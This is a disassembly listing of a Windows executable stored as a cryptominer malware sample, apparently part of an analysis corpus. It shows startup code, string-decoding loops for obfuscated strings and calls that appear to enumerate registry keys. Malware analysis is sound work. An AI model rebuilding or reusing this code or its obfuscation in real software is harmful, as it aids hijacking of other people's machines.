
malware_samples/miner/7a1ce7981617497fe17c998698146437831520e9ab4dd5c454097ccf061f093e.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	c3                   	ret
   140001001:	48 83 ec 28          	sub    $0x28,%rsp
   140001005:	48 8b 05 f4 73 57 00 	mov    0x5773f4(%rip),%rax        # 0x140578400
   14000100c:	48 8b 0d 9d 73 57 00 	mov    0x57739d(%rip),%rcx        # 0x1405783b0
   140001013:	31 d2                	xor    %edx,%edx
   140001015:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000101b:	48 8b 05 ee 73 57 00 	mov    0x5773ee(%rip),%rax        # 0x140578410
   140001022:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
   140001027:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000102d:	48 8b 05 ec 73 57 00 	mov    0x5773ec(%rip),%rax        # 0x140578420
   140001034:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000103a:	75 47                	jne    0x140001083
   14000103c:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   140001040:	48 01 c8             	add    %rcx,%rax
   140001043:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   140001049:	75 38                	jne    0x140001083
   14000104b:	8b 48 18             	mov    0x18(%rax),%ecx
   14000104e:	66 81 f9 0b 01       	cmp    $0x10b,%cx
   140001053:	74 09                	je     0x14000105e
   140001055:	66 81 f9 0b 02       	cmp    $0x20b,%cx
   14000105a:	74 11                	je     0x14000106d
   14000105c:	eb 25                	jmp    0x140001083
   14000105e:	83 78 74 0e          	cmpl   $0xe,0x74(%rax)
   140001062:	76 1f                	jbe    0x140001083
   140001064:	83 b8 e8 00 00 00 00 	cmpl   $0x0,0xe8(%rax)
   14000106b:	eb 10                	jmp    0x14000107d
   14000106d:	83 b8 84 00 00 00 0e 	cmpl   $0xe,0x84(%rax)
   140001074:	76 0d                	jbe    0x140001083
   140001076:	83 b8 f8 00 00 00 00 	cmpl   $0x0,0xf8(%rax)
   14000107d:	0f 95 c2             	setne  %dl
   140001080:	0f b6 d2             	movzbl %dl,%edx
   140001083:	48 8b 05 66 73 57 00 	mov    0x577366(%rip),%rax        # 0x1405783f0
   14000108a:	89 15 7c 9f 57 00    	mov    %edx,0x579f7c(%rip)        # 0x14057b00c
   140001090:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001095:	83 38 00             	cmpl   $0x0,(%rax)
   140001098:	75 05                	jne    0x14000109f
   14000109a:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000109f:	e8 24 2e 00 00       	call   0x140003ec8
   1400010a4:	e8 a7 2d 00 00       	call   0x140003e50
   1400010a9:	48 8b 15 10 74 57 00 	mov    0x577410(%rip),%rdx        # 0x1405784c0
   1400010b0:	8b 12                	mov    (%rdx),%edx
   1400010b2:	89 10                	mov    %edx,(%rax)
   1400010b4:	e8 a7 2d 00 00       	call   0x140003e60
   1400010b9:	48 8b 15 e0 73 57 00 	mov    0x5773e0(%rip),%rdx        # 0x1405784a0
   1400010c0:	8b 12                	mov    (%rdx),%edx
   1400010c2:	89 10                	mov    %edx,(%rax)
   1400010c4:	e8 b7 21 00 00       	call   0x140003280
   1400010c9:	48 8b 05 90 72 57 00 	mov    0x577290(%rip),%rax        # 0x140578360
   1400010d0:	83 38 01             	cmpl   $0x1,(%rax)
   1400010d3:	75 0c                	jne    0x1400010e1
   1400010d5:	48 8b 0d 04 74 57 00 	mov    0x577404(%rip),%rcx        # 0x1405784e0
   1400010dc:	e8 80 27 00 00       	call   0x140003861
   1400010e1:	31 c0                	xor    %eax,%eax
   1400010e3:	48 83 c4 28          	add    $0x28,%rsp
   1400010e7:	c3                   	ret
   1400010e8:	48 83 ec 38          	sub    $0x38,%rsp
   1400010ec:	48 8b 05 fd 73 57 00 	mov    0x5773fd(%rip),%rax        # 0x1405784f0
   1400010f3:	4c 8d 05 1e 9f 57 00 	lea    0x579f1e(%rip),%r8        # 0x14057b018
   1400010fa:	48 8d 15 1f 9f 57 00 	lea    0x579f1f(%rip),%rdx        # 0x14057b020
   140001101:	48 8d 0d 20 9f 57 00 	lea    0x579f20(%rip),%rcx        # 0x14057b028
   140001108:	8b 00                	mov    (%rax),%eax
   14000110a:	89 05 f4 9e 57 00    	mov    %eax,0x579ef4(%rip)        # 0x14057b004
   140001110:	48 8d 05 ed 9e 57 00 	lea    0x579eed(%rip),%rax        # 0x14057b004
   140001117:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000111c:	48 8b 05 8d 73 57 00 	mov    0x57738d(%rip),%rax        # 0x1405784b0
   140001123:	44 8b 08             	mov    (%rax),%r9d
   140001126:	e8 8d 2d 00 00       	call   0x140003eb8
   14000112b:	90                   	nop
   14000112c:	48 83 c4 38          	add    $0x38,%rsp
   140001130:	c3                   	ret
   140001131:	41 56                	push   %r14
   140001133:	41 55                	push   %r13
   140001135:	41 54                	push   %r12
   140001137:	55                   	push   %rbp
   140001138:	57                   	push   %rdi
   140001139:	56                   	push   %rsi
   14000113a:	53                   	push   %rbx
   14000113b:	48 83 ec 20          	sub    $0x20,%rsp
   14000113f:	48 8b 2d fa 72 57 00 	mov    0x5772fa(%rip),%rbp        # 0x140578440
   140001146:	48 8b 35 73 c0 57 00 	mov    0x57c073(%rip),%rsi        # 0x14057d1c0
   14000114d:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140001154:	00 00 
   140001156:	48 8b 58 08          	mov    0x8(%rax),%rbx
   14000115a:	31 c0                	xor    %eax,%eax
   14000115c:	f0 48 0f b1 5d 00    	lock cmpxchg %rbx,0x0(%rbp)
   140001162:	74 0e                	je     0x140001172
   140001164:	48 39 c3             	cmp    %rax,%rbx
   140001167:	74 0d                	je     0x140001176
   140001169:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   14000116e:	ff d6                	call   *%rsi
   140001170:	eb e8                	jmp    0x14000115a
   140001172:	31 f6                	xor    %esi,%esi
   140001174:	eb 05                	jmp    0x14000117b
   140001176:	be 01 00 00 00       	mov    $0x1,%esi
   14000117b:	48 8b 1d ce 72 57 00 	mov    0x5772ce(%rip),%rbx        # 0x140578450
   140001182:	8b 03                	mov    (%rbx),%eax
   140001184:	ff c8                	dec    %eax
   140001186:	75 0c                	jne    0x140001194
   140001188:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   14000118d:	e8 46 2d 00 00       	call   0x140003ed8
   140001192:	eb 2b                	jmp    0x1400011bf
   140001194:	8b 03                	mov    (%rbx),%eax
   140001196:	85 c0                	test   %eax,%eax
   140001198:	75 1b                	jne    0x1400011b5
   14000119a:	48 8b 15 ef 72 57 00 	mov    0x5772ef(%rip),%rdx        # 0x140578490
   1400011a1:	48 8b 0d d8 72 57 00 	mov    0x5772d8(%rip),%rcx        # 0x140578480
   1400011a8:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   1400011ae:	e8 35 2d 00 00       	call   0x140003ee8
   1400011b3:	eb 0a                	jmp    0x1400011bf
   1400011b5:	c7 05 49 9e 57 00 01 	movl   $0x1,0x579e49(%rip)        # 0x14057b008
   1400011bc:	00 00 00 
   1400011bf:	8b 03                	mov    (%rbx),%eax
   1400011c1:	ff c8                	dec    %eax
   1400011c3:	75 19                	jne    0x1400011de
   1400011c5:	48 8b 15 a4 72 57 00 	mov    0x5772a4(%rip),%rdx        # 0x140578470
   1400011cc:	48 8b 0d 8d 72 57 00 	mov    0x57728d(%rip),%rcx        # 0x140578460
   1400011d3:	e8 10 2d 00 00       	call   0x140003ee8
   1400011d8:	c7 03 02 00 00 00    	movl   $0x2,(%rbx)
   1400011de:	85 f6                	test   %esi,%esi
   1400011e0:	75 06                	jne    0x1400011e8
   1400011e2:	31 c0                	xor    %eax,%eax
   1400011e4:	48 87 45 00          	xchg   %rax,0x0(%rbp)
   1400011e8:	48 8b 05 b1 71 57 00 	mov    0x5771b1(%rip),%rax        # 0x1405783a0
   1400011ef:	48 8b 00             	mov    (%rax),%rax
   1400011f2:	48 85 c0             	test   %rax,%rax
   1400011f5:	74 0c                	je     0x140001203
   1400011f7:	45 31 c0             	xor    %r8d,%r8d
   1400011fa:	ba 02 00 00 00       	mov    $0x2,%edx
   1400011ff:	31 c9                	xor    %ecx,%ecx
   140001201:	ff d0                	call   *%rax
   140001203:	e8 a3 23 00 00       	call   0x1400035ab
   140001208:	48 8b 0d c1 72 57 00 	mov    0x5772c1(%rip),%rcx        # 0x1405784d0
   14000120f:	45 31 e4             	xor    %r12d,%r12d
   140001212:	ff 15 a0 bf 57 00    	call   *0x57bfa0(%rip)        # 0x14057d1b8
   140001218:	48 8b 15 11 72 57 00 	mov    0x577211(%rip),%rdx        # 0x140578430
   14000121f:	48 8d 0d da fd ff ff 	lea    -0x226(%rip),%rcx        # 0x140001000
   140001226:	48 89 02             	mov    %rax,(%rdx)
   140001229:	e8 4a 2c 00 00       	call   0x140003e78
   14000122e:	e8 bd 21 00 00       	call   0x1400033f0
   140001233:	48 63 1d ee 9d 57 00 	movslq 0x579dee(%rip),%rbx        # 0x14057b028
   14000123a:	8d 4b 01             	lea    0x1(%rbx),%ecx
   14000123d:	48 63 c9             	movslq %ecx,%rcx
   140001240:	48 c1 e1 03          	shl    $0x3,%rcx
   140001244:	e8 df 2c 00 00       	call   0x140003f28
   140001249:	4c 8b 35 d0 9d 57 00 	mov    0x579dd0(%rip),%r14        # 0x14057b020
   140001250:	49 89 c5             	mov    %rax,%r13
   140001253:	44 39 e3             	cmp    %r12d,%ebx
   140001256:	7e 2b                	jle    0x140001283
   140001258:	4b 8b 0c e6          	mov    (%r14,%r12,8),%rcx
   14000125c:	e8 d7 2c 00 00       	call   0x140003f38
   140001261:	48 8d 68 01          	lea    0x1(%rax),%rbp
   140001265:	48 89 e9             	mov    %rbp,%rcx
   140001268:	e8 bb 2c 00 00       	call   0x140003f28
   14000126d:	48 89 e9             	mov    %rbp,%rcx
   140001270:	4b 89 44 e5 00       	mov    %rax,0x0(%r13,%r12,8)
   140001275:	48 89 c7             	mov    %rax,%rdi
   140001278:	4b 8b 34 e6          	mov    (%r14,%r12,8),%rsi
   14000127c:	49 ff c4             	inc    %r12
   14000127f:	f3 a4                	rep movsb (%rsi),(%rdi)
   140001281:	eb d0                	jmp    0x140001253
   140001283:	31 c0                	xor    %eax,%eax
   140001285:	85 db                	test   %ebx,%ebx
   140001287:	4c 89 2d 92 9d 57 00 	mov    %r13,0x579d92(%rip)        # 0x14057b020
   14000128e:	48 0f 48 d8          	cmovs  %rax,%rbx
   140001292:	31 c0                	xor    %eax,%eax
   140001294:	49 89 44 dd 00       	mov    %rax,0x0(%r13,%rbx,8)
   140001299:	e8 c0 1f 00 00       	call   0x14000325e
   14000129e:	48 8b 05 1b 71 57 00 	mov    0x57711b(%rip),%rax        # 0x1405783c0
   1400012a5:	4c 8b 05 6c 9d 57 00 	mov    0x579d6c(%rip),%r8        # 0x14057b018
   1400012ac:	8b 0d 76 9d 57 00    	mov    0x579d76(%rip),%ecx        # 0x14057b028
   1400012b2:	48 8b 00             	mov    (%rax),%rax
   1400012b5:	4c 89 00             	mov    %r8,(%rax)
   1400012b8:	48 8b 15 61 9d 57 00 	mov    0x579d61(%rip),%rdx        # 0x14057b020
   1400012bf:	e8 1c 2d 00 00       	call   0x140003fe0
   1400012c4:	83 3d 41 9d 57 00 00 	cmpl   $0x0,0x579d41(%rip)        # 0x14057b00c
   1400012cb:	89 05 3f 9d 57 00    	mov    %eax,0x579d3f(%rip)        # 0x14057b010
   1400012d1:	89 c1                	mov    %eax,%ecx
   1400012d3:	75 05                	jne    0x1400012da
   1400012d5:	e8 2e 2c 00 00       	call   0x140003f08
   1400012da:	83 3d 27 9d 57 00 00 	cmpl   $0x0,0x579d27(%rip)        # 0x14057b008
   1400012e1:	75 05                	jne    0x1400012e8
   1400012e3:	e8 f8 2b 00 00       	call   0x140003ee0
   1400012e8:	8b 05 22 9d 57 00    	mov    0x579d22(%rip),%eax        # 0x14057b010
   1400012ee:	48 83 c4 20          	add    $0x20,%rsp
   1400012f2:	5b                   	pop    %rbx
   1400012f3:	5e                   	pop    %rsi
   1400012f4:	5f                   	pop    %rdi
   1400012f5:	5d                   	pop    %rbp
   1400012f6:	41 5c                	pop    %r12
   1400012f8:	41 5d                	pop    %r13
   1400012fa:	41 5e                	pop    %r14
   1400012fc:	c3                   	ret
   1400012fd:	48 83 ec 28          	sub    $0x28,%rsp
   140001301:	48 8b 05 e8 70 57 00 	mov    0x5770e8(%rip),%rax        # 0x1405783f0
   140001308:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000130e:	e8 1e fe ff ff       	call   0x140001131
   140001313:	90                   	nop
   140001314:	90                   	nop
   140001315:	48 83 c4 28          	add    $0x28,%rsp
   140001319:	c3                   	ret
   14000131a:	48 83 ec 28          	sub    $0x28,%rsp
   14000131e:	48 8b 05 cb 70 57 00 	mov    0x5770cb(%rip),%rax        # 0x1405783f0
   140001325:	31 d2                	xor    %edx,%edx
   140001327:	89 10                	mov    %edx,(%rax)
   140001329:	e8 03 fe ff ff       	call   0x140001131
   14000132e:	90                   	nop
   14000132f:	90                   	nop
   140001330:	48 83 c4 28          	add    $0x28,%rsp
   140001334:	c3                   	ret
   140001335:	48 83 ec 28          	sub    $0x28,%rsp
   140001339:	e8 b2 2b 00 00       	call   0x140003ef0
   14000133e:	48 83 f8 01          	cmp    $0x1,%rax
   140001342:	19 c0                	sbb    %eax,%eax
   140001344:	48 83 c4 28          	add    $0x28,%rsp
   140001348:	c3                   	ret
   140001349:	90                   	nop
   14000134a:	90                   	nop
   14000134b:	90                   	nop
   14000134c:	90                   	nop
   14000134d:	90                   	nop
   14000134e:	90                   	nop
   14000134f:	90                   	nop
   140001350:	48 8d 0d 05 00 00 00 	lea    0x5(%rip),%rcx        # 0x14000135c
   140001357:	e9 d9 ff ff ff       	jmp    0x140001335
   14000135c:	c3                   	ret
   14000135d:	90                   	nop
   14000135e:	90                   	nop
   14000135f:	90                   	nop
   140001360:	c3                   	ret
   140001361:	c3                   	ret
   140001362:	c3                   	ret
   140001363:	c3                   	ret
   140001364:	c3                   	ret
   140001365:	c3                   	ret
   140001366:	c3                   	ret
   140001367:	c3                   	ret
   140001368:	c3                   	ret
   140001369:	c3                   	ret
   14000136a:	c3                   	ret
   14000136b:	c3                   	ret
   14000136c:	c3                   	ret
   14000136d:	c3                   	ret
   14000136e:	c3                   	ret
   14000136f:	c3                   	ret
   140001370:	c3                   	ret
   140001371:	c3                   	ret
   140001372:	c3                   	ret
   140001373:	c3                   	ret
   140001374:	c3                   	ret
   140001375:	c3                   	ret
   140001376:	c3                   	ret
   140001377:	c3                   	ret
   140001378:	c3                   	ret
   140001379:	c3                   	ret
   14000137a:	c3                   	ret
   14000137b:	c3                   	ret
   14000137c:	41 57                	push   %r15
   14000137e:	41 56                	push   %r14
   140001380:	41 55                	push   %r13
   140001382:	41 54                	push   %r12
   140001384:	55                   	push   %rbp
   140001385:	57                   	push   %rdi
   140001386:	56                   	push   %rsi
   140001387:	53                   	push   %rbx
   140001388:	48 83 ec 48          	sub    $0x48,%rsp
   14000138c:	4c 8b a4 24 b0 00 00 	mov    0xb0(%rsp),%r12
   140001393:	00 
   140001394:	4c 8b ac 24 b8 00 00 	mov    0xb8(%rsp),%r13
   14000139b:	00 
   14000139c:	4c 8b bc 24 c0 00 00 	mov    0xc0(%rsp),%r15
   1400013a3:	00 
   1400013a4:	4c 8b b4 24 c8 00 00 	mov    0xc8(%rsp),%r14
   1400013ab:	00 
   1400013ac:	48 89 cf             	mov    %rcx,%rdi
   1400013af:	48 89 d1             	mov    %rdx,%rcx
   1400013b2:	4c 89 c3             	mov    %r8,%rbx
   1400013b5:	4c 89 ce             	mov    %r9,%rsi
   1400013b8:	e8 8e 07 00 00       	call   0x140001b4b
   1400013bd:	84 c0                	test   %al,%al
   1400013bf:	75 50                	jne    0x140001411
   1400013c1:	89 f2                	mov    %esi,%edx
   1400013c3:	48 89 d9             	mov    %rbx,%rcx
   1400013c6:	89 f5                	mov    %esi,%ebp
   1400013c8:	e8 b7 06 00 00       	call   0x140001a84
   1400013cd:	89 74 24 28          	mov    %esi,0x28(%rsp)
   1400013d1:	4d 89 f1             	mov    %r14,%r9
   1400013d4:	4d 89 e8             	mov    %r13,%r8
   1400013d7:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   1400013dc:	4c 89 e2             	mov    %r12,%rdx
   1400013df:	48 89 f9             	mov    %rdi,%rcx
   1400013e2:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400013e7:	e8 02 19 00 00       	call   0x140002cee
   1400013ec:	48 89 d9             	mov    %rbx,%rcx
   1400013ef:	89 ea                	mov    %ebp,%edx
   1400013f1:	48 89 c6             	mov    %rax,%rsi
   1400013f4:	e8 8b 06 00 00       	call   0x140001a84
   1400013f9:	48 89 f1             	mov    %rsi,%rcx
   1400013fc:	48 83 c4 48          	add    $0x48,%rsp
   140001400:	5b                   	pop    %rbx
   140001401:	5e                   	pop    %rsi
   140001402:	5f                   	pop    %rdi
   140001403:	5d                   	pop    %rbp
   140001404:	41 5c                	pop    %r12
   140001406:	41 5d                	pop    %r13
   140001408:	41 5e                	pop    %r14
   14000140a:	41 5f                	pop    %r15
   14000140c:	e9 8b 1c 00 00       	jmp    0x14000309c
   140001411:	48 83 c4 48          	add    $0x48,%rsp
   140001415:	5b                   	pop    %rbx
   140001416:	5e                   	pop    %rsi
   140001417:	5f                   	pop    %rdi
   140001418:	5d                   	pop    %rbp
   140001419:	41 5c                	pop    %r12
   14000141b:	41 5d                	pop    %r13
   14000141d:	41 5e                	pop    %r14
   14000141f:	41 5f                	pop    %r15
   140001421:	c3                   	ret
   140001422:	90                   	nop
   140001423:	90                   	nop
   140001424:	90                   	nop
   140001425:	90                   	nop
   140001426:	90                   	nop
   140001427:	90                   	nop
   140001428:	90                   	nop
   140001429:	90                   	nop
   14000142a:	90                   	nop
   14000142b:	90                   	nop
   14000142c:	90                   	nop
   14000142d:	90                   	nop
   14000142e:	90                   	nop
   14000142f:	90                   	nop
   140001430:	c3                   	ret
   140001431:	c3                   	ret
   140001432:	c3                   	ret
   140001433:	c3                   	ret
   140001434:	c3                   	ret
   140001435:	c3                   	ret
   140001436:	c3                   	ret
   140001437:	c3                   	ret
   140001438:	c3                   	ret
   140001439:	c3                   	ret
   14000143a:	56                   	push   %rsi
   14000143b:	53                   	push   %rbx
   14000143c:	48 83 ec 28          	sub    $0x28,%rsp
   140001440:	47 8d 44 00 01       	lea    0x1(%r8,%r8,1),%r8d
   140001445:	48 89 cb             	mov    %rcx,%rbx
   140001448:	48 89 d6             	mov    %rdx,%rsi
   14000144b:	66 44 89 41 02       	mov    %r8w,0x2(%rcx)
   140001450:	48 89 d1             	mov    %rdx,%rcx
   140001453:	e8 08 2b 00 00       	call   0x140003f60
   140001458:	48 89 73 08          	mov    %rsi,0x8(%rbx)
   14000145c:	01 c0                	add    %eax,%eax
   14000145e:	66 89 03             	mov    %ax,(%rbx)
   140001461:	48 83 c4 28          	add    $0x28,%rsp
   140001465:	5b                   	pop    %rbx
   140001466:	5e                   	pop    %rsi
   140001467:	c3                   	ret
   140001468:	41 57                	push   %r15
   14000146a:	41 56                	push   %r14
   14000146c:	41 55                	push   %r13
   14000146e:	41 54                	push   %r12
   140001470:	55                   	push   %rbp
   140001471:	57                   	push   %rdi
   140001472:	56                   	push   %rsi
   140001473:	53                   	push   %rbx
   140001474:	48 81 ec f8 03 00 00 	sub    $0x3f8,%rsp
   14000147b:	80 3d 0e ae 57 00 00 	cmpb   $0x0,0x57ae0e(%rip)        # 0x14057c290
   140001482:	48 8d 35 57 6a 57 00 	lea    0x576a57(%rip),%rsi        # 0x140577ee0
   140001489:	b9 c2 00 00 00       	mov    $0xc2,%ecx
   14000148e:	48 8d 2d 0b ae 57 00 	lea    0x57ae0b(%rip),%rbp        # 0x14057c2a0
   140001495:	48 8d bc 24 f0 01 00 	lea    0x1f0(%rsp),%rdi
   14000149c:	00 
   14000149d:	48 8d 9c 24 f0 01 00 	lea    0x1f0(%rsp),%rbx
   1400014a4:	00 
   1400014a5:	f3 a4                	rep movsb (%rsi),(%rdi)
   1400014a7:	75 27                	jne    0x1400014d0
   1400014a9:	b9 c2 00 00 00       	mov    $0xc2,%ecx
   1400014ae:	48 89 ef             	mov    %rbp,%rdi
   1400014b1:	48 89 de             	mov    %rbx,%rsi
   1400014b4:	c6 05 a7 ae 57 00 01 	movb   $0x1,0x57aea7(%rip)        # 0x14057c362
   1400014bb:	f3 a4                	rep movsb (%rsi),(%rdi)
   1400014bd:	48 8d 0d 73 ff ff ff 	lea    -0x8d(%rip),%rcx        # 0x140001437
   1400014c4:	c6 05 c5 ad 57 00 01 	movb   $0x1,0x57adc5(%rip)        # 0x14057c290
   1400014cb:	e8 65 fe ff ff       	call   0x140001335
   1400014d0:	80 3d 8b ae 57 00 00 	cmpb   $0x0,0x57ae8b(%rip)        # 0x14057c362
   1400014d7:	74 30                	je     0x140001509
   1400014d9:	48 8d 05 c0 ad 57 00 	lea    0x57adc0(%rip),%rax        # 0x14057c2a0
   1400014e0:	48 8d 90 c2 00 00 00 	lea    0xc2(%rax),%rdx
   1400014e7:	66 8b 38             	mov    (%rax),%di
   1400014ea:	48 83 c0 02          	add    $0x2,%rax
   1400014ee:	8d 8f 6d 17 00 00    	lea    0x176d(%rdi),%ecx
   1400014f4:	66 81 e1 ff 00       	and    $0xff,%cx
   1400014f9:	66 89 48 fe          	mov    %cx,-0x2(%rax)
   1400014fd:	48 39 c2             	cmp    %rax,%rdx
   140001500:	75 e5                	jne    0x1400014e7
   140001502:	c6 05 59 ae 57 00 00 	movb   $0x0,0x57ae59(%rip)        # 0x14057c362
   140001509:	4c 8d 64 24 70       	lea    0x70(%rsp),%r12
   14000150e:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140001514:	48 89 ea             	mov    %rbp,%rdx
   140001517:	4c 89 e1             	mov    %r12,%rcx
   14000151a:	e8 1b ff ff ff       	call   0x14000143a
   14000151f:	80 3d 3a ad 57 00 00 	cmpb   $0x0,0x57ad3a(%rip)        # 0x14057c260
   140001526:	48 b8 a1 00 c3 00 c0 	movabs $0xc700c000c300a1,%rax
   14000152d:	00 c7 00 
   140001530:	66 c7 84 24 08 02 00 	movw   $0x51,0x208(%rsp)
   140001537:	00 51 00 
   14000153a:	48 89 84 24 f0 01 00 	mov    %rax,0x1f0(%rsp)
   140001541:	00 
   140001542:	48 b8 ba 00 b5 00 b6 	movabs $0xc300b600b500ba,%rax
   140001549:	00 c3 00 
   14000154c:	48 89 84 24 f8 01 00 	mov    %rax,0x1f8(%rsp)
   140001553:	00 
   140001554:	48 b8 9f 00 b2 00 be 	movabs $0xb600be00b2009f,%rax
   14000155b:	00 b6 00 
   14000155e:	48 89 84 24 00 02 00 	mov    %rax,0x200(%rsp)
   140001565:	00 
   140001566:	75 38                	jne    0x1400015a0
   140001568:	0f 28 84 24 f0 01 00 	movaps 0x1f0(%rsp),%xmm0
   14000156f:	00 
   140001570:	0f 10 8c 24 fa 01 00 	movups 0x1fa(%rsp),%xmm1
   140001577:	00 
   140001578:	48 8d 0d b7 fe ff ff 	lea    -0x149(%rip),%rcx        # 0x140001436
   14000157f:	c6 05 04 ad 57 00 01 	movb   $0x1,0x57ad04(%rip)        # 0x14057c28a
   140001586:	c6 05 d3 ac 57 00 01 	movb   $0x1,0x57acd3(%rip)        # 0x14057c260
   14000158d:	0f 29 05 dc ac 57 00 	movaps %xmm0,0x57acdc(%rip)        # 0x14057c270
   140001594:	0f 11 0d df ac 57 00 	movups %xmm1,0x57acdf(%rip)        # 0x14057c27a
   14000159b:	e8 95 fd ff ff       	call   0x140001335
   1400015a0:	80 3d e3 ac 57 00 00 	cmpb   $0x0,0x57ace3(%rip)        # 0x14057c28a
   1400015a7:	48 8d 0d c2 ac 57 00 	lea    0x57acc2(%rip),%rcx        # 0x14057c270
   1400015ae:	74 29                	je     0x1400015d9
   1400015b0:	48 89 c8             	mov    %rcx,%rax
   1400015b3:	4c 8d 41 1a          	lea    0x1a(%rcx),%r8
   1400015b7:	66 8b 38             	mov    (%rax),%di
   1400015ba:	48 83 c0 02          	add    $0x2,%rax
   1400015be:	8d 97 af 7d 00 00    	lea    0x7daf(%rdi),%edx
   1400015c4:	66 81 e2 ff 00       	and    $0xff,%dx
   1400015c9:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   1400015cd:	49 39 c0             	cmp    %rax,%r8
   1400015d0:	75 e5                	jne    0x1400015b7
   1400015d2:	c6 05 b1 ac 57 00 00 	movb   $0x0,0x57acb1(%rip)        # 0x14057c28a
   1400015d9:	48 8d 84 24 80 00 00 	lea    0x80(%rsp),%rax
   1400015e0:	00 
   1400015e1:	48 89 ca             	mov    %rcx,%rdx
   1400015e4:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1400015ea:	31 ed                	xor    %ebp,%ebp
   1400015ec:	48 89 c1             	mov    %rax,%rcx
   1400015ef:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400015f4:	49 bf 01 00 09 00 fc 	movabs $0xf700fc00090001,%r15
   1400015fb:	00 f7 00 
   1400015fe:	4c 8d 2d 4b ac 57 00 	lea    0x57ac4b(%rip),%r13        # 0x14057c250
   140001605:	e8 30 fe ff ff       	call   0x14000143a
   14000160a:	45 31 c0             	xor    %r8d,%r8d
   14000160d:	31 d2                	xor    %edx,%edx
   14000160f:	31 c9                	xor    %ecx,%ecx
   140001611:	48 8d 84 24 c0 00 00 	lea    0xc0(%rsp),%rax
   140001618:	00 
   140001619:	48 89 54 24 60       	mov    %rdx,0x60(%rsp)
   14000161e:	ba 08 00 00 00       	mov    $0x8,%edx
   140001623:	4c 8d 35 06 ac 57 00 	lea    0x57ac06(%rip),%r14        # 0x14057c230
   14000162a:	48 89 8c 24 c8 00 00 	mov    %rcx,0xc8(%rsp)
   140001631:	00 
   140001632:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140001637:	4c 89 84 24 e0 00 00 	mov    %r8,0xe0(%rsp)
   14000163e:	00 
   14000163f:	4c 89 84 24 e8 00 00 	mov    %r8,0xe8(%rsp)
   140001646:	00 
   140001647:	49 89 c0             	mov    %rax,%r8
   14000164a:	c7 84 24 c0 00 00 00 	movl   $0x30,0xc0(%rsp)
   140001651:	30 00 00 00 
   140001655:	c7 84 24 d8 00 00 00 	movl   $0x40,0xd8(%rsp)
   14000165c:	40 00 00 00 
   140001660:	4c 89 a4 24 d0 00 00 	mov    %r12,0xd0(%rsp)
   140001667:	00 
   140001668:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000166d:	e8 3e 1b 00 00       	call   0x1400031b0
   140001672:	85 c0                	test   %eax,%eax
   140001674:	79 77                	jns    0x1400016ed
   140001676:	31 c0                	xor    %eax,%eax
   140001678:	e9 67 03 00 00       	jmp    0x1400019e4
   14000167d:	48 8d 84 24 00 01 00 	lea    0x100(%rsp),%rax
   140001684:	00 
   140001685:	4c 8b 44 24 48       	mov    0x48(%rsp),%r8
   14000168a:	48 89 8c 24 c8 00 00 	mov    %rcx,0xc8(%rsp)
   140001691:	00 
   140001692:	ba 01 00 00 00       	mov    $0x1,%edx
   140001697:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   14000169c:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   1400016a1:	8b 84 24 fc 00 00 00 	mov    0xfc(%rsp),%eax
   1400016a8:	c7 84 24 c0 00 00 00 	movl   $0x30,0xc0(%rsp)
   1400016af:	30 00 00 00 
   1400016b3:	66 89 44 24 70       	mov    %ax,0x70(%rsp)
   1400016b8:	66 89 44 24 72       	mov    %ax,0x72(%rsp)
   1400016bd:	31 c0                	xor    %eax,%eax
   1400016bf:	c7 84 24 d8 00 00 00 	movl   $0x240,0xd8(%rsp)
   1400016c6:	40 02 00 00 
   1400016ca:	4c 89 a4 24 d0 00 00 	mov    %r12,0xd0(%rsp)
   1400016d1:	00 
   1400016d2:	48 89 84 24 e0 00 00 	mov    %rax,0xe0(%rsp)
   1400016d9:	00 
   1400016da:	48 89 84 24 e8 00 00 	mov    %rax,0xe8(%rsp)
   1400016e1:	00 
   1400016e2:	e8 c9 1a 00 00       	call   0x1400031b0
   1400016e7:	85 c0                	test   %eax,%eax
   1400016e9:	79 40                	jns    0x14000172b
   1400016eb:	ff c5                	inc    %ebp
   1400016ed:	48 8d 74 24 5c       	lea    0x5c(%rsp),%rsi
   1400016f2:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   1400016f7:	45 31 c0             	xor    %r8d,%r8d
   1400016fa:	89 ea                	mov    %ebp,%edx
   1400016fc:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140001701:	4c 8d 8c 24 f0 00 00 	lea    0xf0(%rsp),%r9
   140001708:	00 
   140001709:	c7 44 24 20 00 01 00 	movl   $0x100,0x20(%rsp)
   140001710:	00 
   140001711:	e8 a9 1a 00 00       	call   0x1400031bf
   140001716:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   14000171b:	3d 1a 00 00 80       	cmp    $0x8000001a,%eax
   140001720:	0f 85 57 ff ff ff    	jne    0x14000167d
   140001726:	e9 af 02 00 00       	jmp    0x1400019da
   14000172b:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140001730:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   140001735:	49 89 d9             	mov    %rbx,%r9
   140001738:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000173e:	c7 44 24 20 00 02 00 	movl   $0x200,0x20(%rsp)
   140001745:	00 
